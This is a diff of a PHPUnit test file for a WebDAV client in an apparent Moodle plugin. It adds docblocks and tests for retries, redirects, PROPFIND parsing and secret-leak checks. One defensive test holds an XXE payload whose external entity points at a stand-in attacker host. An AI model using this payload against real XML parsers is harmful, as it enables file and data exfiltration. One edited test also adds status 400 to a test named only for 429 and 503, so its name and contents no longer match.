@@ -16,6 +16,7 @@
 
 namespace local_coursepilot\webdav;
 
+use local_coursepilot\tests\caught_throwable;
 use local_coursepilot\tests\webdav\fake_webdav_transport;
 use PHPUnit\Framework\Attributes\CoversClass;
 
@@ -31,11 +32,13 @@ use PHPUnit\Framework\Attributes\CoversClass;
 #[CoversClass(webdav_client::class)]
 #[CoversClass(\local_coursepilot\webdav\webdav_error::class)]
 final class webdav_client_test extends \advanced_testcase {
+    use caught_throwable;
 
     /**
      * Fixed retry clock: the sleeper advances time rather than waiting,
      * as required by the specification.
      *
+     * @param fake_webdav_transport $fake The fake.
      * @return array{0: webdav_client, 1: fake_webdav_transport}
      */
     private function client(fake_webdav_transport $fake): array {
@@ -49,6 +52,12 @@ final class webdav_client_test extends \advanced_testcase {
         return [new webdav_client($fake, $clock, $sleeper), $fake];
     }
 
+    /**
+     * Provides url.
+     *
+     * @param string $path The path.
+     * @return string
+     */
     private function url(string $path = ''): string {
         return 'https://fake.example/dav' . $path;
     }
@@ -295,12 +304,32 @@ final class webdav_client_test extends \advanced_testcase {
     }
 
     public function test_429_and_503_are_treated_as_unclear_and_retried(): void {
-        $codes = [429, 503];
+        $codes = [400, 429, 503];
         foreach ($codes as $code) {
             $calls = 0;
             $transport = new class ($code, $calls) implements webdav_transport {
-                public function __construct(private readonly int $code, private int $calls) {
+                /**
+                 * Creates the webdav client test.
+                 *
+                 * @param int $code The code.
+                 * @param int $calls The calls.
+                 */
+                public function __construct(
+                    /** @var int The code. */
+                    private readonly int $code,
+                    /** @var int The calls. */
+                    private int $calls,
+                ) {
                 }
+                /**
+                 * Provides request.
+                 *
+                 * @param string $method The method.
+                 * @param string $url The url.
+                 * @param string[] $headers The headers.
+                 * @param ?string $body The body.
+                 * @return webdav_response
+                 */
                 public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                     $this->calls++;
                     if ($this->calls === 1) {
@@ -319,7 +348,7 @@ final class webdav_client_test extends \advanced_testcase {
                     $time += $s;
                 },
             );
-            $this->assertSame('ok', $client->get('https://fake.example/dav/x.md'), (string) $code);
+            $this->assertSame('ok', $this->succeeded(fn() => $client->get('https://fake.example/dav/x.md')), (string) $code);
         }
     }
 
@@ -356,7 +385,9 @@ final class webdav_client_test extends \advanced_testcase {
     }
 
     /**
-     * @return array<string, array{0: int}>
+     * Provides redirect statuscodes.
+     *
+     * @return array<int, array{0: int}>
      */
     public static function redirect_statuscodes(): array {
         return ['301' => [301], '302' => [302], '303' => [303], '307' => [307], '308' => [308]];
@@ -371,9 +402,31 @@ final class webdav_client_test extends \advanced_testcase {
     #[\PHPUnit\Framework\Attributes\DataProvider('redirect_statuscodes')]
     public function test_3xx_response_is_a_named_redirected_error_and_is_not_followed(int $statuscode): void {
         $transport = new class ($statuscode) implements webdav_transport {
+            /**
+             * Calls.
+             *
+             * @var int
+             */
             public int $calls = 0;
-            public function __construct(private readonly int $statuscode) {
+            /**
+             * Creates the webdav client test.
+             *
+             * @param int $statuscode The statuscode.
+             */
+            public function __construct(
+                /** @var int The statuscode. */
+                private readonly int $statuscode,
+            ) {
             }
+            /**
+             * Provides request.
+             *
+             * @param string $method The method.
+             * @param string $url The url.
+             * @param string[] $headers The headers.
+             * @param ?string $body The body.
+             * @return webdav_response
+             */
             public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                 $this->calls++;
                 return new webdav_response($this->statuscode, ['location' => 'https://anderswo.example/dav/'], '');
@@ -402,7 +455,17 @@ final class webdav_client_test extends \advanced_testcase {
      */
     public function test_put_on_3xx_is_redirected_and_never_repeated_at_the_server_chosen_address(): void {
         $transport = new class implements webdav_transport {
+            /** @var int Number of requests seen. */
             public int $calls = 0;
+            /**
+             * Provides request.
+             *
+             * @param string $method The method.
+             * @param string $url The url.
+             * @param string[] $headers The headers.
+             * @param ?string $body The body.
+             * @return webdav_response
+             */
             public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                 $this->calls++;
                 return new webdav_response(302, ['location' => 'https://anderswo.example/dav/x.md'], '');
@@ -422,6 +485,15 @@ final class webdav_client_test extends \advanced_testcase {
 
     public function test_propfind_with_unreadable_body_on_2xx_is_unclear_not_an_empty_folder(): void {
         $transport = new class implements webdav_transport {
+            /**
+             * Provides request.
+             *
+             * @param string $method The method.
+             * @param string $url The url.
+             * @param string[] $headers The headers.
+             * @param ?string $body The body.
+             * @return webdav_response
+             */
             public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                 return new webdav_response(207, [], 'kein XML');
             }
@@ -447,8 +519,25 @@ final class webdav_client_test extends \advanced_testcase {
             . '<!DOCTYPE d:multistatus [<!ENTITY xxe SYSTEM "https://angreifer.invalid/loot">]>'
             . '<d:multistatus xmlns:d="DAV:"><d:response><d:href>&xxe;</d:href></d:response></d:multistatus>';
         $transport = new class ($xxe) implements webdav_transport {
-            public function __construct(private readonly string $body) {
+            /**
+             * Creates the webdav client test.
+             *
+             * @param string $body The body.
+             */
+            public function __construct(
+                /** @var string The body. */
+                private readonly string $body,
+            ) {
             }
+            /**
+             * Provides request.
+             *
+             * @param string $method The method.
+             * @param string $url The url.
+             * @param string[] $headers The headers.
+             * @param ?string $body The body.
+             * @return webdav_response
+             */
             public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                 return new webdav_response(207, [], $this->body);
             }
@@ -474,6 +563,15 @@ final class webdav_client_test extends \advanced_testcase {
 
     public function test_transport_connection_failure_becomes_unreachable(): void {
         $transport = new class implements webdav_transport {
+            /**
+             * Provides request.
+             *
+             * @param string $method The method.
+             * @param string $url The url.
+             * @param string[] $headers The headers.
+             * @param ?string $body The body.
+             * @return webdav_response
+             */
             public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                 throw new webdav_transport_exception('Zeitueberschreitung.');
             }
@@ -527,8 +625,25 @@ final class webdav_client_test extends \advanced_testcase {
     public function test_secret_never_leaks_via_a_redirected_error(): void {
         $secret = 'g3h31m-' . uniqid();
         $transport = new class ($secret) implements webdav_transport {
-            public function __construct(private readonly string $secret) {
+            /**
+             * Creates the webdav client test.
+             *
+             * @param string $secret The secret.
+             */
+            public function __construct(
+                /** @var string The secret. */
+                private readonly string $secret,
+            ) {
             }
+            /**
+             * Provides request.
+             *
+             * @param string $method The method.
+             * @param string $url The url.
+             * @param string[] $headers The headers.
+             * @param ?string $body The body.
+             * @return webdav_response
+             */
             public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                 return new webdav_response(302, ['location' => 'https://anderswo.example/' . $this->secret], '');
             }
@@ -563,6 +678,15 @@ final class webdav_client_test extends \advanced_testcase {
 
         // UNREACHABLE: the transport throws without ever seeing a secret.
         $transport = new class implements webdav_transport {
+            /**
+             * Provides request.
+             *
+             * @param string $method The method.
+             * @param string $url The url.
+             * @param string[] $headers The headers.
+             * @param ?string $body The body.
+             * @return webdav_response
+             */
             public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                 throw new webdav_transport_exception('Zeitueberschreitung.');
             }
@@ -573,5 +697,104 @@ final class webdav_client_test extends \advanced_testcase {
         } catch (webdav_error $e) {
             $this->assertStringNotContainsString($secret, $e->getMessage());
         }
+    }
+
+    public function test_propfind_rejects_an_unsupported_depth(): void {
+        [$client] = $this->client(new fake_webdav_transport());
+
+        $this->expectException(\InvalidArgumentException::class);
+        $client->propfind($this->url('/ordner'), 2);
+    }
+
+    public function test_propfind_of_the_unnamed_root_returns_no_entry(): void {
+        [$client] = $this->client(new fake_webdav_transport());
+
+        $this->assertSame([], $client->propfind('https://fake.example/', 0));
+    }
+
+    /**
+     * Without injected clock and sleeper the client waits for real before retrying a throttled request.
+     */
+    public function test_default_clock_and_sleeper_retry_a_throttled_request(): void {
+        $fake = new fake_webdav_transport();
+        $fake->seed_file('/dav/x.md', 'ok');
+        $fake->throttle(1);
+        $client = new webdav_client($fake);
+        $start = microtime(true);
+
+        $this->assertSame('ok', $client->get($this->url('/x.md')));
+
+        $this->assertCount(2, $fake->requests());
+        $this->assertGreaterThanOrEqual(0.19, microtime(true) - $start);
+    }
+
+    public function test_sniff_mimetype_from_content_recognises_svg_as_svg_xml(): void {
+        $svg = '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"></svg>';
+
+        $this->assertSame('image/svg+xml', webdav_client::sniff_mimetype_from_content($svg));
+    }
+
+    /**
+     * Folders list size 0, files without modification time or ETag list 0 / null, and an
+     * unreadable modification time is 0 rather than a failure value.
+     */
+    public function test_propfind_lists_fallback_values_for_missing_or_unreadable_properties(): void {
+        $xml = '<?xml version="1.0"?><d:multistatus xmlns:d="DAV:">'
+            . $this->multistatus_entry('/dav/ordner/', '<d:resourcetype><d:collection/></d:resourcetype>'
+                . '<d:getlastmodified>Wed, 01 Jan 2025 10:00:00 GMT</d:getlastmodified><d:getetag>"f1"</d:getetag>')
+            . $this->multistatus_entry('/dav/roh.md', '<d:resourcetype/><d:getcontentlength>12</d:getcontentlength>')
+            . $this->multistatus_entry('/dav/kaputt.md', '<d:resourcetype/><d:getcontentlength>3</d:getcontentlength>'
+                . '<d:getlastmodified>kein Datum</d:getlastmodified>')
+            . '</d:multistatus>';
+        $transport = new class ($xml) implements webdav_transport {
+            /**
+             * Creates the double.
+             *
+             * @param string $xml Fixed multistatus answer.
+             */
+            public function __construct(
+                /** @var string Fixed multistatus answer. */
+                private readonly string $xml,
+            ) {
+            }
+
+            /**
+             * Answers every request with the fixed multistatus.
+             *
+             * @param string $method The method.
+             * @param string $url The url.
+             * @param string[] $headers The headers.
+             * @param ?string $body The body.
+             * @return webdav_response
+             */
+            public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
+                return new webdav_response(207, ['content-type' => 'application/xml'], $this->xml);
+            }
+        };
+
+        $entries = (new webdav_client($transport))->propfind('https://fake.example/dav/', 1);
+
+        $this->assertSame(['ordner', 'roh.md', 'kaputt.md'], array_column($entries, 'name'));
+        $this->assertSame(['folder', 0, strtotime('Wed, 01 Jan 2025 10:00:00 GMT'), '"f1"', ''], [
+            $entries[0]['type'], $entries[0]['size'], $entries[0]['timemodified'], $entries[0]['etag'], $entries[0]['mimetype'],
+        ]);
+        $this->assertSame(['file', 12, 0, null], [
+            $entries[1]['type'], $entries[1]['size'], $entries[1]['timemodified'], $entries[1]['etag'],
+        ]);
+        $this->assertSame(['file', 3, 0, null], [
+            $entries[2]['type'], $entries[2]['size'], $entries[2]['timemodified'], $entries[2]['etag'],
+        ]);
+    }
+
+    /**
+     * One `response` node with a successful property set.
+     *
+     * @param string $href
+     * @param string $props Inner XML of the `prop` node.
+     * @return string
+     */
+    private function multistatus_entry(string $href, string $props): string {
+        return '<d:response><d:href>' . $href . '</d:href><d:propstat><d:prop>' . $props . '</d:prop>'
+            . '<d:status>HTTP/1.1 200 OK</d:status></d:propstat></d:response>';
     }
 }
